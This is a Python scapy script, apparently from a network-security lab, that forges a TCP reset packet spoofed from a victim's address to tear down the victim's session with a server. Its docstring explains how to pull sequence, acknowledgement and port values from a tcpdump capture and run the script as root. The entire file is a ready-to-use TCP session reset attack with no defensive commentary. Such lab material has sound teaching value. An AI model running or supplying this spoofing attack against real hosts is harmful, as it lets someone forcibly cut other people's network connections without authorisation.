#!/usr/bin/env python3
"""Inject a spoofed RST to tear down the victim -> server TCP session.

Read SEQ / ACK / source port from the capture first:

    sudo tcpdump -nn -r ~/session.pcap

Then run on the attacker (as root):

    sudo python3 rst-hijack.py <seq> <ack> <sport>
"""

import sys

from scapy.all import IP, TCP, send

VICTIM = '172.21.0.2'
SERVER = '172.21.0.3'
DPORT = 9999


def main():
    if len(sys.argv) != 4:
        print('Usage: sudo python3 rst-hijack.py <seq> <ack> <sport>')
        sys.exit(2)
    seq, ack, sport = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3])
    pkt = (IP(src=VICTIM, dst=SERVER)
           / TCP(sport=sport, dport=DPORT, flags='R', seq=seq, ack=ack))
    send(pkt, verbose=False)
    print('RST sent: seq=%d ack=%d sport=%d -> session torn down' % (seq, ack, sport))


if __name__ == '__main__':
    main()
